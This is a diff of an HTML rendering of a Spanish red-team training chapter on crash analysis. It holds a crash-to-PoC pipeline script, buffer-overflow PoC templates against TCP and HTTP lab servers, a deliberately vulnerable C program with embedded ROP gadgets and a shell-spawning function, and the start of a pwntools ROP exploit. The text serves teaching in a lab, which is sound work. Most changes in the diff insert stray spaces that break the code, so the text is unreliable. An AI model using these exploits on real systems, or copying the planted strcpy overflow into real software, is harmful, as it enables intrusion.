-<p>def step2_analyze(self):</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>def step 2_analyze (self):</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <p>"""Analizar crash con ASAN"""</p>
-<p>print("[*] Step 2: Analyzing crash with ASAN...")</p>
+<p>print ("[*] Step 2: Analyzing crash with ASAN...")</p>
 <h1>Ejecutar versión ASAN</h1>
-<p>asan_target = self. target. replace('vuln_no_protect', 'vuln_asan')</p>
-<p>if not os. path. exists(asan_target):</p>
+<p>asan_target = self. target. replace ('vuln_no_protect', 'vuln_asan')</p>
+<p>if not os. path. exists (asan_target):</p>
 <p>asan_target = self. target + "_asan"</p>
 <p>try:</p>
-<p>result = subprocess. run(</p>
+<p>result = subprocess. run (</p>
 <p>[asan_target, self. test_case, self. minimized_payload or self. original_payload],</p>
 <p>capture_output=True,</p>
 <p>text=True,</p>
@@ -1613,24 +1613,24 @@ pwntools es la herramienta estándar para desarrollo de exploits y PoCs en Pytho
 <p>else:</p>
 <p>self. crash_info['type'] = "unknown"</p>
 <h1>Extraer ubicación</h1>
-<p>match = re. search(r'#0.*in (\w+) (.+:\d+)', output)</p>
+<p>match = re. search (r'#0.*in (\w+) (.+:\d+)', output)</p>
 <p>if match:</p>
-<p>self. crash_info['function'] = match. group(1)</p>
-<p>self. crash_info['location'] = match. group(2)</p>
-<p>print(f" Type: {self. crash_info. get('type', 'unknown')}")</p>
-<p>print(f" Function: {self. crash_info. get('function', 'unknown')}")</p>
-<p>print(f" Location: {self. crash_info. get('location', 'unknown')}")</p>
+<p>self. crash_info['function'] = match. group (1)</p>
+<p>self. crash_info['location'] = match. group (2)</p>
+<p>print (f" Type: {self. crash_info. get ('type', 'unknown')}")</p>
+<p>print (f" Function: {self. crash_info. get ('function', 'unknown')}")</p>
+<p>print (f" Location: {self. crash_info. get ('location', 'unknown')}")</p>
 <p>except Exception as e:</p>
-<p>print(f" ASAN analysis failed: {e}")</p>
+<p>print (f" ASAN analysis failed: {e}")</p>
 <p>return self. crash_info</p>
-<p>def step3_generate_poc(self):</p>
-<p>"""Generar script PoC"""</p>
-<p>print("[*] Step 3: Generating PoC script...")</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>def step 3_generate_poc (self):</p>
+<p>"""Generar script Po C"""</p>
+<p>print ("[*] Step 3: Generating Po C script...")</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <p>payload = self. minimized_payload or self. original_payload</p>
-<p>crash_type = self. crash_info. get('type', 'unknown')</p>
-<p>poc_template = f'''#!/usr/bin/env python3</p>
-<p>PoC: {crash_type}</p>
+<p>crash_type = self. crash_info. get ('type', 'unknown')</p>
+<p>poc_template = f'''#!/usr/bin/env python 3</p>
+<p>Po C: {crash_type}</p>
 <p>Target: {self. target}</p>
 <p>Test Case: {self. test_case}</p>
 <p>Generated by crash_to_poc. py</p>
@@ -1639,95 +1639,95 @@ pwntools es la herramienta estándar para desarrollo de exploits y PoCs en Pytho
 <p>TARGET = "{self. target}"</p>
 <p>TEST_CASE = "{self. test_case}"</p>
 <h1>Minimized crash payload</h1>
-<p>PAYLOAD = {repr(payload)}</p>
-<p>def trigger_crash():</p>
+<p>PAYLOAD = {repr (payload)}</p>
+<p>def trigger_crash ():</p>
 <p>"""Trigger the vulnerability"""</p>
-<p>log. info(f"Payload size: {{len(PAYLOAD)}} bytes")</p>
-<p>p = process([TARGET, TEST_CASE, PAYLOAD])</p>
-<p>p. wait(timeout=5)</p>
+<p>log. info (f"Payload size: {{len (PAYLOAD)}} bytes")</p>
+<p>p = process ([TARGET, TEST_CASE, PAYLOAD])</p>
+<p>p. wait (timeout=5)</p>
 <p>if p. returncode < 0:</p>
-<p>log. success(f"Crash triggered (signal {{-p. returncode}})")</p>
+<p>log. success (f"Crash triggered (signal {{-p. returncode}})")</p>
 <p>return True</p>
 <p>elif p. returncode != 0:</p>
-<p>log. success(f"Crash triggered (exit code {{p. returncode}})")</p>
+<p>log. success (f"Crash triggered (exit code {{p. returncode}})")</p>
 <p>return True</p>
 <p>else:</p>
-<p>log. failure("No crash")</p>
+<p>log. failure ("No crash")</p>
 <p>return False</p>
-<p>def test_reliability(n=10):</p>
-<p>"""Test PoC reliability"""</p>
-<p>successes = sum(1 for _ in range(n) if trigger_crash())</p>
-<p>log. info(f"Reliability: {{successes}}/{{n}} ({{100*successes/n:.1f}}%)")</p>
+<p>def test_reliability (n=10):</p>
+<p>"""Test Po C reliability"""</p>
+<p>successes = sum (1 for _ in range (n) if trigger_crash ())</p>
+<p>log. info (f"Reliability: {{successes}}/{{n}} ({{100*successes/n:.1 f}}%)")</p>
 <p>return successes / n</p>
 <p>if __name__ == "__main__":</p>
 <p>import sys</p>
 <p>if "--test" in sys. argv:</p>
-<p>test_reliability()</p>
+<p>test_reliability ()</p>
 <p>else:</p>
-<p>trigger_crash()</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
-<p>poc_path = f"poc_{crash_type. replace('-', '_')}.py"</p>
-<p>with open(poc_path, 'w') as f:</p>
-<p>f. write(poc_template)</p>
-<p>os. chmod(poc_path, 0o755)</p>
-<p>print(f" Generated: {poc_path}")</p>
+<p>trigger_crash ()</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
+<p>poc_path = f"poc_{crash_type. replace ('-', '_')}. py"</p>
+<p>with open (poc_path, 'w') as f:</p>
+<p>f. write (poc_template)</p>
+<p>os. chmod (poc_path, 0 o 755)</p>
+<p>print (f" Generated: {poc_path}")</p>
 <p>return poc_path</p>
-<p>def step4_test(self):</p>
-<p>"""Probar el PoC generado"""</p>
-<p>print("[*] Step 4: Testing PoC reliability...")</p>
+<p>def step 4_test (self):</p>
+<p>"""Probar el Po C generado"""</p>
+<p>print ("[*] Step 4: Testing Po C reliability...")</p>
 <p>payload = self. minimized_payload or self. original_payload</p>
 <p>successes = 0</p>
 <p>attempts = 10</p>
-<p>for _ in range(attempts):</p>
-<p>if self. _crashes(payload):</p>
+<p>for _ in range (attempts):</p>
+<p>if self. _crashes (payload):</p>
 <p>successes += 1</p>
 <p>rate = (successes / attempts) * 100</p>
-<p>print(f" Reliability: {successes}/{attempts} ({rate:.1f}%)")</p>
+<p>print (f" Reliability: {successes}/{attempts} ({rate:.1 f}%)")</p>
 <p>return rate >= 90</p>
-<p>def _crashes(self, payload):</p>
+<p>def _crashes (self, payload):</p>
 <p>"""Helper: verificar si payload causa crash"""</p>
 <p>try:</p>
-<p>result = subprocess. run(</p>
+<p>result = subprocess. run (</p>
 <p>[self. target, self. test_case, payload],</p>
 <p>capture_output=True,</p>
 <p>timeout=2</p>
 <p>return result. returncode < 0 or result. returncode == 1</p>
 <p>except:</p>
 <p>return False</p>
-<p>def run_pipeline(self):</p>
+<p>def run_pipeline (self):</p>
 <p>"""Ejecutar pipeline completo"""</p>
-<p>print(f"\n{'='*60}")</p>
-<p>print("CRASH-TO-POC PIPELINE")</p>
-<p>print(f"{'='*60}")</p>
-<p>print(f"Target: {self. target}")</p>
-<p>print(f"Test Case: {self. test_case}")</p>
-<p>print(f"Original Payload Size: {len(self. original_payload)} bytes")</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
-<p>print(f"{'='*60}\n")</p>
-<p>self. step1_minimize()</p>
-<p>self. step2_analyze()</p>
-<p>poc_path = self. step3_generate_poc()</p>
-<p>reliable = self. step4_test()</p>
-<p>print(f"\n{'='*60}")</p>
-<p>print("PIPELINE COMPLETE")</p>
-<p>print(f"{'='*60}")</p>
-<p>print(f"PoC Script: {poc_path}")</p>
-<p>print(f"Reliable: {'Yes' if reliable else 'No'}")</p>
-<p>print(f"{'='*60}\n")</p>
+<p>print (f"\n{'='*60}")</p>
+<p>print ("CRASH-TO-POC PIPELINE")</p>
+<p>print (f"{'='*60}")</p>
+<p>print (f"Target: {self. target}")</p>
+<p>print (f"Test Case: {self. test_case}")</p>
+<p>print (f"Original Payload Size: {len (self. original_payload)} bytes")</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
+<p>print (f"{'='*60}\n")</p>
+<p>self. step 1_minimize ()</p>
+<p>self. step 2_analyze ()</p>
+<p>poc_path = self. step 3_generate_poc ()</p>
+<p>reliable = self. step 4_test ()</p>
+<p>print (f"\n{'='*60}")</p>
+<p>print ("PIPELINE COMPLETE")</p>
+<p>print (f"{'='*60}")</p>
+<p>print (f"Po C Script: {poc_path}")</p>
+<p>print (f"Reliable: {'Yes' if reliable else 'No'}")</p>
+<p>print (f"{'='*60}\n")</p>
 <p>return poc_path</p>
 <p>if __name__ == "__main__":</p>
-<p>if len(sys. argv) < 4:</p>
-<p>print(f"Usage: {sys. argv[0]} <target> <test_case> <payload>")</p>
-<p>print(f"Example: {sys. argv[0]} ./vuln_no_protect 1 \"{'A'*100}\"")</p>
-<p>sys. exit(1)</p>
-<p>pipeline = CrashToPoC(sys. argv[1], sys. argv[2], sys. argv[3])</p>
-<p>pipeline. run_pipeline()</p>
+<p>if len (sys. argv) < 4:</p>
+<p>print (f"Usage: {sys. argv[0]} <target> <test_case> <payload>")</p>
+<p>print (f"Example: {sys. argv[0]} ./vuln_no_protect 1 \"{'A'*100}\"")</p>
+<p>sys. exit (1)</p>
+<p>pipeline = Crash To Po C (sys. argv[1], sys. argv[2], sys. argv[3])</p>
+<p>pipeline. run_pipeline ()</p>
 <ol>
-  <li>5.10. 4. 6.3 PoC para Servicios de Red</li>
+  <li>5.10. 4. 6.3 Po C para Servicios de Red</li>
 </ol>
 <p>Plantilla Genérica TCP:</p>
-<p>#!/usr/bin/env python3</p>
-<p>network_poc_template. py - PoC para vulnerabilidad en servicio de red</p>
+<p>#!/usr/bin/env python 3</p>
+<p>network_poc_template. py - Po C para vulnerabilidad en servicio de red</p>
 <p>from pwn import *</p>
 <p>import socket</p>
 <h1>Configuración del target</h1>
@@ -1735,94 +1735,94 @@ pwntools es la herramienta estándar para desarrollo de exploits y PoCs en Pytho
 <h2>PORT = 8888</h2>
 <h2>TIMEOUT = 5</h2>
 <p>context. log_level = 'info'</p>
-<p>def send_payload(payload):</p>
+<p>def send_payload (payload):</p>
 <p>"""Envía payload al servidor y retorna respuesta"""</p>
 <p>try:</p>
-<p>conn = remote(HOST, PORT, timeout=TIMEOUT)</p>
-<p>conn. send(payload)</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
-<p>response = conn. recvall(timeout=2)</p>
-<p>conn. close()</p>
+<p>conn = remote (HOST, PORT, timeout=TIMEOUT)</p>
+<p>conn. send (payload)</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
+<p>response = conn. recvall (timeout=2)</p>
+<p>conn. close ()</p>
 <p>return response</p>
-<p>except EOFError:</p>
-<p>log. info("Connection closed by server (possible crash)")</p>
+<p>except EOF Error:</p>
+<p>log. info ("Connection closed by server (possible crash)")</p>
 <p>return None</p>
 <p>except Exception as e:</p>
-<p>log. error(f"Connection error: {e}")</p>
+<p>log. error (f"Connection error: {e}")</p>
 <p>return None</p>
-<p>def check_server_alive():</p>
+<p>def check_server_alive ():</p>
 <p>"""Verifica si el servidor está respondiendo"""</p>
 <p>try:</p>
-<p>conn = remote(HOST, PORT, timeout=2)</p>
-<p>conn. close()</p>
+<p>conn = remote (HOST, PORT, timeout=2)</p>
+<p>conn. close ()</p>
 <p>return True</p>
 <p>except:</p>
 <p>return False</p>
-<p>def trigger_vulnerability():</p>
+<p>def trigger_vulnerability ():</p>
 <p>"""Trigger principal de la vulnerabilidad"""</p>
-<p>log. info(f"Target: {HOST}:{PORT}")</p>
+<p>log. info (f"Target: {HOST}:{PORT}")</p>
 <h1>Verificar que servidor está vivo antes</h1>
-<p>if not check_server_alive():</p>
-<p>log. failure("Server not responding")</p>
+<p>if not check_server_alive ():</p>
+<p>log. failure ("Server not responding")</p>
 <p>return False</p>
 <h1>Construir payload malicioso</h1>
 <h1>Ajustar según la vulnerabilidad específica</h1>
 <p>overflow_size = 256</p>
 <p>payload = b"GET /" + b"A" * overflow_size + b" HTTP/1. 1\r\n\r\n"</p>
-<p>log. info(f"Sending {len(payload)} byte payload")</p>
-<p>response = send_payload(payload)</p>
+<p>log. info (f"Sending {len (payload)} byte payload")</p>
+<p>response = send_payload (payload)</p>
 <h1>Verificar crash</h1>
-<p>if not check_server_alive():</p>
-<p>log. success("Server crashed!")</p>
+<p>if not check_server_alive ():</p>
+<p>log. success ("Server crashed!")</p>
 <p>return True</p>
 <p>elif response is None:</p>
-<p>log. success("Connection dropped (possible crash)")</p>
+<p>log. success ("Connection dropped (possible crash)")</p>
 <p>return True</p>
 <p>else:</p>
-<p>log. warning("Server still alive")</p>
+<p>log. warning ("Server still alive")</p>
 <p>return False</p>
 <p>if __name__ == "__main__":</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
-<p>trigger_vulnerability()</p>
-<p>PoC HTTP con requests:</p>
-<p>#!/usr/bin/env python3</p>
-<p>http_poc. py - PoC para vulnerabilidad en servidor HTTP</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
+<p>trigger_vulnerability ()</p>
+<p>Po C HTTP con requests:</p>
+<p>#!/usr/bin/env python 3</p>
+<p>http_poc. py - Po C para vulnerabilidad en servidor HTTP</p>
 <p>import requests</p>
 <p>import time</p>
-<p>TARGET = "http://127. 0.0. 1:8888"</p>
+<p>TARGET = "<a href="http://127." target="_blank">http://127.</a> 0.0. 1:8888"</p>
 <h2>TIMEOUT = 5</h2>
-<p>def check_alive():</p>
+<p>def check_alive ():</p>
 <p>"""Verificar si servidor responde"""</p>
 <p>try:</p>
-<p>requests. get(TARGET, timeout=2)</p>
+<p>requests. get (TARGET, timeout=2)</p>
 <p>return True</p>
 <p>except:</p>
 <p>return False</p>
-<p>def trigger_overflow():</p>
+<p>def trigger_overflow ():</p>
 <p>"""Enviar request malicioso"""</p>
-<p>print(f"[*] Target: {TARGET}")</p>
-<p>if not check_alive():</p>
-<p>print("[-] Server not responding")</p>
+<p>print (f"[*] Target: {TARGET}")</p>
+<p>if not check_alive ():</p>
+<p>print ("[-] Server not responding")</p>
 <p>return False</p>
 <h1>Path overflow</h1>
 <p>malicious_path = "/" + "A" * 2000</p>
-<p>print(f"[*] Sending overflow ({len(malicious_path)} byte path)")</p>
+<p>print (f"[*] Sending overflow ({len (malicious_path)} byte path)")</p>
 <p>try:</p>
-<p>requests. get(TARGET + malicious_path, timeout=TIMEOUT)</p>
-<p>except requests. exceptions. ConnectionError:</p>
-<p>print("[+] Connection error (possible crash)")</p>
-<p>except requests. exceptions. ReadTimeout:</p>
-<p>print("[+] Timeout (possible hang)")</p>
-<p>time. sleep(1)</p>
-<p>if not check_alive():</p>
-<p>print("[+] Server crashed!")</p>
+<p>requests. get (TARGET + malicious_path, timeout=TIMEOUT)</p>
+<p>except requests. exceptions. Connection Error:</p>
+<p>print ("[+] Connection error (possible crash)")</p>
+<p>except requests. exceptions. Read Timeout:</p>
+<p>print ("[+] Timeout (possible hang)")</p>
+<p>time. sleep (1)</p>
+<p>if not check_alive ():</p>
+<p>print ("[+] Server crashed!")</p>
 <p>return True</p>
 <p>else:</p>
-<p>print("[-] Server still alive")</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>print ("[-] Server still alive")</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <p>return False</p>
 <p>if __name__ == "__main__":</p>
-<p>trigger_overflow()</p>
+<p>trigger_overflow ()</p>
 <ol>
   <li>5.11. 4. 6.4 Análisis de Crashes en Rust y Go</li>
 </ol>
@@ -1848,33 +1848,33 @@ pwntools es la herramienta estándar para desarrollo de exploits y PoCs en Pytho
 <p>./target_race < crash_input</p>
 <h1>Depuración con Delve</h1>
 <p>dlv debug</p>
-<p>(dlv) break main. vulnerableFunction</p>
+<p>(dlv) break main. vulnerable Function</p>
 <p>(dlv) continue</p>
 <p>(dlv) stack # Stack trace</p>
 <p>(dlv) goroutines # Ver todas las goroutines</p>
-<p>TablaComparativa:</p>
+<p>Tabla Comparativa:</p>
 <p>Aspecto C/C++ Rust Go</p>
-<p>Crashtípico SIGSEGV,SIGABRT Panic(safe), Panic</p>
+<p>Crashtípico SIGSEGV, SIGABRT Panic(safe), Panic</p>
 <p>SIGSEGV(unsafe)</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <p>Aspecto C/C++ Rust Go</p>
-<p>Infoautomática Mínima Stacktrace,mensaje Stacktrace</p>
+<p>Infoautomática Mínima Stacktrace, mensaje Stacktrace</p>
 <p>completo</p>
-<p>Sanitizers ASAN,MSAN,TSAN ASAN(nightly),Miri Racedetector</p>
-<p>Debugger GDB,LLDB rust-gdb,rust-lldb Delve</p>
-<p>Fronteradeataque Todo unsafe,FFI CGo,reflect</p>
+<p>Sanitizers ASAN, MSAN, TSAN ASAN(nightly), Miri Racedetector</p>
+<p>Debugger GDB, LLDB rust-gdb, rust-lldb Delve</p>
+<p>Fronteradeataque Todo unsafe, FFI C Go, reflect</p>
 <ol>
   <li>6. 4. 7 Proyecto Capstone: Pipeline Completo de Análisis</li>
   <li>6.1. 4. 7.1 Escenario</li>
 </ol>
 <p>Has completado sesiones de fuzzing en los targets del laboratorio y tienes crashes de: - vulnera-</p>
-<p>ble_suite. c(testcases1-5)-vuln_http_server. c(accesibleporred)</p>
+<p>ble_suite. c(testcases 1-5)-vuln_http_server. c(accesibleporred)</p>
 <p>Tumanagernecesitaunreporteidentificando:1.¿Cuántosbugsúnicosexistenrealmente?2.¿Cuá-</p>
-<p>lessonexplotablesremotamente?3. ScriptsdePoCparalosissuesdemayorseveridad.</p>
+<p>lessonexplotablesremotamente?3. Scriptsde Po Cparalosissuesdemayorseveridad.</p>
 <ol>
   <li>6.2. 4. 7.2 Binario con ROP Gadgets</li>
 </ol>
-<p>Paraejerciciosavanzadosdeexplotación,usamosunaversiónmejoradacongadgetsROPembebi-</p>
+<p>Paraejerciciosavanzadosdeexplotación, usamosunaversiónmejoradacongadgets RO Pembebi-</p>
 <p>dos:</p>
 <p>// vulnerable_suite_rop. c - Versión con gadgets ROP para explotación</p>
 <p>// Compilar: gcc -g -fno-stack-protector -no-pie -z execstack vulnerable_suite_rop. c -o vuln_rop</p>
@@ -1886,87 +1886,87 @@ pwntools es la herramienta estándar para desarrollo de exploits y PoCs en Pytho
 <p>// GADGETS ROP - Sobreviven compilación con __attribute__((used))</p>
 <p>// ============================================================================</p>
 <p>// pop rdi; ret - Setear primer argumento (RDI)</p>
-<p>__attribute__((naked, used, section(".text. gadgets")))</p>
-<p>void gadget_pop_rdi(void) {</p>
-<p>__asm__ volatile ("pop%rdi\n" "ret\n");</p>
-<p>// pop rsi; pop r15; ret - Setear segundo argumento (RSI)</p>
-<p>__attribute__((naked, used, section(".text. gadgets")))</p>
-<p>void gadget_pop_rsi_r15(void) {</p>
-<p>__asm__ volatile ("pop%rsi\n" "pop%r15\n" "ret\n");</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>__attribute__((naked, used, section (". text. gadgets")))</p>
+<p>void gadget_pop_rdi (void) {</p>
+<p>__asm__ volatile ("pop% rdi\n" "ret\n");</p>
+<p>// pop rsi; pop r 15; ret - Setear segundo argumento (RSI)</p>
+<p>__attribute__((naked, used, section (". text. gadgets")))</p>
+<p>void gadget_pop_rsi_r 15(void) {</p>
+<p>__asm__ volatile ("pop% rsi\n" "pop% r 15\n" "ret\n");</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <p>// pop rdx; ret - Setear tercer argumento (RDX)</p>
-<p>__attribute__((naked, used, section(".text. gadgets")))</p>
-<p>void gadget_pop_rdx(void) {</p>
-<p>__asm__ volatile ("pop%rdx\n" "ret\n");</p>
+<p>__attribute__((naked, used, section (". text. gadgets")))</p>
+<p>void gadget_pop_rdx (void) {</p>
+<p>__asm__ volatile ("pop% rdx\n" "ret\n");</p>
 <p>// jmp rsp - Saltar a shellcode en stack (requiere -z execstack)</p>
-<p>__attribute__((naked, used, section(".text. gadgets")))</p>
-<p>void gadget_jmp_rsp(void) {</p>
-<p>__asm__ volatile ("jmp *%rsp\n");</p>
+<p>__attribute__((naked, used, section (". text. gadgets")))</p>
+<p>void gadget_jmp_rsp (void) {</p>
+<p>__asm__ volatile ("jmp *% rsp\n");</p>
 <p>// syscall; ret - Syscall directa</p>
-<p>__attribute__((naked, used, section(".text. gadgets")))</p>
-<p>void gadget_syscall(void) {</p>
+<p>__attribute__((naked, used, section (". text. gadgets")))</p>
+<p>void gadget_syscall (void) {</p>
 <p>__asm__ volatile ("syscall\n" "ret\n");</p>
 <p>// pop rax; ret - Setear número de syscall</p>
-<p>__attribute__((naked, used, section(".text. gadgets")))</p>
-<p>void gadget_pop_rax(void) {</p>
-<p>__asm__ volatile ("pop%rax\n" "ret\n");</p>
+<p>__attribute__((naked, used, section (". text. gadgets")))</p>
+<p>void gadget_pop_rax (void) {</p>
+<p>__asm__ volatile ("pop% rax\n" "ret\n");</p>
 <p>// ============================================================================</p>
 <p>// FUNCIONES WIN - Targets para demostrar explotación exitosa</p>
 <p>// ============================================================================</p>
-<p>void win(void) {</p>
-<p>printf("\n========================================\n");</p>
-<p>printf(" EXPLOTACIÓN EXITOSA!\n");</p>
-<p>printf(" Redirigiste ejecución a win()\n");</p>
-<p>printf("========================================\n\n");</p>
-<p>exit(0);</p>
-<p>void win_with_arg(long magic) {</p>
-<p>if (magic == 0xdeadbeefcafebabe) {</p>
-<p>printf("\n========================================\n");</p>
-<p>printf(" EXPLOTACIÓN AVANZADA EXITOSA!\n");</p>
-<p>printf(" Argumento correcto: 0x%lx\n", magic);</p>
-<p>printf("========================================\n\n");</p>
-<p>exit(0);</p>
+<p>void win (void) {</p>
+<p>printf ("\n========================================\n");</p>
+<p>printf (" EXPLOTACIÓN EXITOSA!\n");</p>
+<p>printf (" Redirigiste ejecución a win ()\n");</p>
+<p>printf ("========================================\n\n");</p>
+<p>exit (0);</p>
+<p>void win_with_arg (long magic) {</p>
+<p>if (magic == 0 xdeadbeefcafebabe) {</p>
+<p>printf ("\n========================================\n");</p>
+<p>printf (" EXPLOTACIÓN AVANZADA EXITOSA!\n");</p>
+<p>printf (" Argumento correcto: 0 x% lx\n", magic);</p>
+<p>printf ("========================================\n\n");</p>
+<p>exit (0);</p>
 <p>} else {</p>
-<p>printf("[!] win_with_arg llamada con argumento incorrecto: 0x%lx\n", magic);</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
-<p>void spawn_shell(void) {</p>
-<p>printf("[*] Spawning shell...\n");</p>
-<p>execve("/bin/sh", NULL, NULL);</p>
+<p>printf ("[!] win_with_arg llamada con argumento incorrecto: 0 x% lx\n", magic);</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
+<p>void spawn_shell (void) {</p>
+<p>printf ("[*] Spawning shell...\n");</p>
+<p>execve ("/bin/sh", NULL, NULL);</p>
 <p>// Funciones vulnerables (igual que vulnerable_suite. c original)</p>
-<p>void stack_overflow(char *input) {</p>
+<p>void stack_overflow (char *input) {</p>
 <p>char buffer[64];</p>
-<p>strcpy(buffer, input); // ¡Sin verificación de límites!</p>
-<p>void print_gadgets(void) {</p>
-<p>printf("\n=== Gadgets ROP Disponibles ===\n");</p>
-<p>printf("pop rdi; ret @ %p\n", (void*)gadget_pop_rdi);</p>
-<p>printf("pop rsi; pop r15; ret @ %p\n", (void*)gadget_pop_rsi_r15);</p>
-<p>printf("pop rdx; ret @ %p\n", (void*)gadget_pop_rdx);</p>
-<p>printf("pop rax; ret @ %p\n", (void*)gadget_pop_rax);</p>
-<p>printf("jmp rsp @ %p\n", (void*)gadget_jmp_rsp);</p>
-<p>printf("syscall; ret @ %p\n", (void*)gadget_syscall);</p>
-<p>printf("\n=== Funciones Win ===\n");</p>
-<p>printf("win() @ %p\n", (void*)win);</p>
-<p>printf("win_with_arg(magic) @ %p (magic=0xdeadbeefcafebabe)\n", (void*)win_with_arg);</p>
-<p>printf("spawn_shell() @ %p\n", (void*)spawn_shell);</p>
-<p>printf("\n=== Info de Explotación ===\n");</p>
-<p>printf("Offset a RIP en stack overflow: 72 bytes\n");</p>
-<p>printf("(64 bytes buffer + 8 bytes RBP guardado)\n\n");</p>
-<p>int main(int argc, char **argv) {</p>
-<p>setbuf(stdout, NULL);</p>
+<p>strcpy (buffer, input); // ¡Sin verificación de límites!</p>
+<p>void print_gadgets (void) {</p>
+<p>printf ("\n=== Gadgets ROP Disponibles ===\n");</p>
+<p>printf ("pop rdi; ret @ % p\n", (void*) gadget_pop_rdi);</p>
+<p>printf ("pop rsi; pop r 15; ret @ % p\n", (void*) gadget_pop_rsi_r 15);</p>
+<p>printf ("pop rdx; ret @ % p\n", (void*) gadget_pop_rdx);</p>
+<p>printf ("pop rax; ret @ % p\n", (void*) gadget_pop_rax);</p>
+<p>printf ("jmp rsp @ % p\n", (void*) gadget_jmp_rsp);</p>
+<p>printf ("syscall; ret @ % p\n", (void*) gadget_syscall);</p>
+<p>printf ("\n=== Funciones Win ===\n");</p>
+<p>printf ("win () @ % p\n", (void*) win);</p>
+<p>printf ("win_with_arg (magic) @ % p (magic=0 xdeadbeefcafebabe)\n", (void*) win_with_arg);</p>
+<p>printf ("spawn_shell () @ % p\n", (void*) spawn_shell);</p>
+<p>printf ("\n=== Info de Explotación ===\n");</p>
+<p>printf ("Offset a RIP en stack overflow: 72 bytes\n");</p>
+<p>printf ("(64 bytes buffer + 8 bytes RBP guardado)\n\n");</p>
+<p>int main (int argc, char **argv) {</p>
+<p>setbuf (stdout, NULL);</p>
 <p>if (argc < 2) {</p>
-<p>printf("Usage: %s <test> [input]\n", argv[0]);</p>
-<p>printf(" 1 <input> - Stack overflow\n");</p>
-<p>printf(" 6 - Mostrar direcciones de gadgets\n");</p>
+<p>printf ("Usage: % s <test> [input]\n", argv[0]);</p>
+<p>printf (" 1 <input> - Stack overflow\n");</p>
+<p>printf (" 6 - Mostrar direcciones de gadgets\n");</p>
 <p>return 1;</p>
-<p>int test = atoi(argv[1]);</p>
-<p>switch(test) {</p>
-<p>case 1: if (argc<3) return 1; stack_overflow(argv[2]); break;</p>
-<p>case 6: print_gadgets(); break;</p>
+<p>int test = atoi (argv[1]);</p>
+<p>switch (test) {</p>
+<p>case 1: if (argc<3) return 1; stack_overflow (argv[2]); break;</p>
+<p>case 6: print_gadgets (); break;</p>
 <p>default: return 1;</p>
 <p>return 0;</p>
 <p>Compilación y Verificación:</p>
 <p>cd ~/crash_analysis_lab</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <h1>Compilar versión para explotación</h1>
 <p>gcc -g -fno-stack-protector -no-pie -z execstack src/vulnerable_suite_rop. c -o vuln_rop</p>
 <h1>Verificar gadgets con ropper</h1>
@@ -1978,12 +1978,12 @@ pwntools es la herramienta estándar para desarrollo de exploits y PoCs en Pytho
 <ol>
   <li>6.3. 4. 7.3 Exploit de Explotación Completo</li>
 </ol>
-<p>#!/usr/bin/env python3</p>
+<p>#!/usr/bin/env python 3</p>
 <p>exploit_rop. py - Exploits para vuln_rop</p>
 <p>Técnicas demostradas:</p>
 <ol>
-  <li>ret2win - Redirigir a win()</li>
-  <li>ROP chain - pop rdi + argumento + win_with_arg()</li>
+  <li>ret 2 win - Redirigir a win ()</li>
+  <li>ROP chain - pop rdi + argumento + win_with_arg ()</li>
   <li>jmp rsp + shellcode</li>
 </ol>
 <p>NOTA: Los bytes NULL en direcciones de 64-bit limitan</p>
@@ -1991,87 +1991,87 @@ pwntools es la herramienta estándar para desarrollo de exploits y PoCs en Pytho
 <p>from pwn import *</p>
 <p>import os</p>
 <p>import subprocess</p>
-<p>LAB_DIR = os. path. expanduser("~/crash_analysis_lab")</p>
-<p>TARGET = os. path. join(LAB_DIR, "vuln_rop")</p>
+<p>LAB_DIR = os. path. expanduser ("~/crash_analysis_lab")</p>
+<p>TARGET = os. path. join (LAB_DIR, "vuln_rop")</p>
 <p>PAYLOAD_FILE = "/tmp/vuln_rop_payload"</p>
-<p>class RopExploit:</p>
+<p>class Rop Exploit:</p>
 <p>def __init__(self):</p>
-<p>os. chdir(LAB_DIR)</p>
+<p>os. chdir (LAB_DIR)</p>
 <p>context. binary = TARGET</p>
 <p>context. log_level = 'info'</p>
-<p>self. gadgets = self. _get_gadgets()</p>
-<p>def _get_gadgets(self):</p>
+<p>self. gadgets = self. _get_gadgets ()</p>
+<p>def _get_gadgets (self):</p>
 <p>"""Parsear direcciones de gadgets del binario"""</p>
 <p>try:</p>
-<p>result = subprocess. run([TARGET, "6"], capture_output=True, text=True)</p>
+<p>result = subprocess. run ([TARGET, "6"], capture_output=True, text=True)</p>
 <p>gadgets = {}</p>
-<p>for line in result. stdout. split('\n'):</p>
+<p>for line in result. stdout. split ('\n'):</p>
 <p>if '@' in line:</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
-<p>parts = line. split('@')</p>
-<p>name = parts[0].strip()</p>
-<p>addr_str = parts[1].strip().split()[0]</p>
-<p>gadgets[name] = int(addr_str, 16)</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
